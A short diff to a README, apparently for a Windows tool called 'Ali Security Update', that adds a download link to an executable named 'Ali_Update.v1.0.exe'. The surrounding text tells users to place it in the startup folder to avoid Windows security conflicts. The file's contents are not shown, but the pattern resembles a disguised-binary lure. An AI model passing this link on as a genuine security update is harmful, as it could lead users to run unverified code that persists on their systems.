@@ -23,5 +23,8 @@ To avoid Windows security conflicts and ensure smooth auto-startup:
 1. Press `Win + R`, type `shell:startup`, and hit Enter.
 2. Create a shortcut of the executable file and paste it into this folder.
 
+## link Downloud
+https://github.com/Ali7GTX/Ali-Security-Update/releases/download/1.0/Ali_Update.v1.0.exe
+
 ---
 Developed by **Ali Hany (A7X)** 💻
